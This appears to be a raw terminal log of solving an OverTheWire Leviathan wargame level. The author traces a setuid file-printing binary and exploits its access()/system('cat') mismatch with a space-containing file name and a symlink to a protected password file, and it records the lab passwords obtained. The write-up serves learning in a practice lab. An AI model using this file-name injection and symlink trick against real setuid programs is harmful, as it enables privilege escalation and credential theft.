ssh -p 2223 leviathan2@leviathan.labs.overthewire.org

ERJ9jTYWXE

soln : 



leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ls -al
total 36
drwxr-xr-x   2 root       root        4096 Jun 24 15:01 .
drwxr-xr-x 150 root       root        4096 Jun 24 15:02 ..
-rw-r--r--   1 root       root         220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root       root         807 Feb 13 12:16 .profile
-r-sr-x---   1 leviathan3 leviathan2 15068 Jun 24 15:01 printfile
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ file printfile
printfile: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=edf95678ff2bfd80bf9c289f61a91a378c55cfb8, for GNU/Linux 3.2.0, not stripped
leviathan2@leviathan:~$ 

leviathan2@leviathan:~$ ltrace ./printfile
__libc_start_main(["./printfile"] <unfinished ...>
puts("*** File Printer ***"*** File Printer ***
)                                                                    = 21
printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
)                                                   = 28
+++ exited (status 255) +++


leviathan2@leviathan:~$ ltrace ./printfile  /etc/leviathan_pass/leviathan0
__libc_start_main(["./printfile", "/etc/leviathan_pass/leviathan0"] <unfinished ...>
access("/etc/leviathan_pass/leviathan0", 4)                                                    = -1
puts("You cant have that file..."You cant have that file...
)                                                             = 27
+++ exited (status 1) +++
leviathan2@leviathan:~$ 


leviathan2@leviathan:~$ cd /tmp
leviathan2@leviathan:/tmp$ mkdir lel
leviathan2@leviathan:/tmp$ cd lel
leviathan2@leviathan:/tmp/lel$ echo "lelele" > pepe
leviathan2@leviathan:/tmp/lel$ ~/printfile 
*** File Printer ***
Usage: /home/leviathan2/printfile filename
leviathan2@leviathan:/tmp/lel$ ~/printfile  pepe
lelele
leviathan2@leviathan:/tmp/lel$ 
leviathan2@leviathan:/tmp/lel$ ltrace  ~/printfile pepe 
__libc_start_main(["/home/leviathan2/printfile", "pepe"] <unfinished ...>
access("pepe", 4)                                                                         = 0
snprintf("/bin/cat pepe", 511, "/bin/cat %s", "pepe")                                     = 13
geteuid()                                                                                 = 12002
geteuid()                                                                                 = 12002
setreuid(12002, 12002)                                                                    = 0
system("/bin/cat pepe"lelele
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 0
+++ exited (status 0) +++
leviathan2@leviathan:/tmp/lel$ 

leviathan2@leviathan:/tmp/lel$ ls -al ~ 
total 36
drwxr-xr-x   2 root       root        4096 Jun 24 15:01 .
drwxr-xr-x 150 root       root        4096 Jun 24 15:02 ..
-rw-r--r--   1 root       root         220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root       root         807 Feb 13 12:16 .profile
-r-sr-x---   1 leviathan3 leviathan2 15068 Jun 24 15:01 printfile
leviathan2@leviathan:/tmp/lel$ 

leviathan2@leviathan:/tmp/lel$ echo "lelele" > lol
leviathan2@leviathan:/tmp/lel$ ls
lol  pepe
leviathan2@leviathan:/tmp/lel$ 
leviathan2@leviathan:/tmp/lel$ man access
leviathan2@leviathan:/tmp/lel$ rm lol  pepe
leviathan2@leviathan:/tmp/lel$ echo "==get flag" > "w3t h4nds"
leviathan2@leviathan:/tmp/lel$ ls
w3t h4nds
leviathan2@leviathan:/tmp/lel$ cat w3t
cat: w3t: No such file or directory
leviathan2@leviathan:/tmp/lel$ cat w3t\h4nds
cat: w3th4nds: No such file or directory
leviathan2@leviathan:/tmp/lel$ ls -la
total 4
drwxrwxr-x  2 leviathan2 leviathan2   60 Jul  5 10:20 .
drwxrwx-wt 89 root       root       2340 Jul  5 10:22 ..
-rw-rw-r--  1 leviathan2 leviathan2   11 Jul  5 10:20 w3t h4nds
leviathan2@leviathan:/tmp/lel$ ln -s /etc/leviathan_pass/leviathan3 w3t 
leviathan2@leviathan:/tmp/lel$ ls -al
total 4
drwxrwxr-x  2 leviathan2 leviathan2   80 Jul  5 10:23 .
drwxrwx-wt 90 root       root       2340 Jul  5 10:23 ..
lrwxrwxrwx  1 leviathan2 leviathan2   30 Jul  5 10:23 w3t -> /etc/leviathan_pass/leviathan3
-rw-rw-r--  1 leviathan2 leviathan2   11 Jul  5 10:20 w3t h4nds
leviathan2@leviathan:/tmp/lel$ ls - al
ls: cannot access '-': No such file or directory
ls: cannot access 'al': No such file or directory
leviathan2@leviathan:/tmp/lel$ ls -al
total 4
drwxrwxr-x  2 leviathan2 leviathan2   80 Jul  5 10:23 .
drwxrwx-wt 90 root       root       2340 Jul  5 10:24 ..
lrwxrwxrwx  1 leviathan2 leviathan2   30 Jul  5 10:23 w3t -> /etc/leviathan_pass/leviathan3
-rw-rw-r--  1 leviathan2 leviathan2   11 Jul  5 10:20 w3t h4nds
leviathan2@leviathan:/tmp/lel$ ls - al
ls: cannot access '-': No such file or directory
ls: cannot access 'al': No such file or directory
leviathan2@leviathan:/tmp/lel$ ls -al
total 4
drwxrwxr-x  2 leviathan2 leviathan2   80 Jul  5 10:23 .
drwxrwx-wt 90 root       root       2340 Jul  5 10:24 ..
lrwxrwxrwx  1 leviathan2 leviathan2   30 Jul  5 10:23 w3t -> /etc/leviathan_pass/leviathan3
-rw-rw-r--  1 leviathan2 leviathan2   11 Jul  5 10:20 w3t h4nds
leviathan2@leviathan:/tmp/lel$ ~/printfile 'w3t h4nds'
PiEpxxknZH
cat: h4nds: No such file or directory
leviathan2@leviathan:/tmp/lel$ 


pass for level 03 : PiEpxxknZH 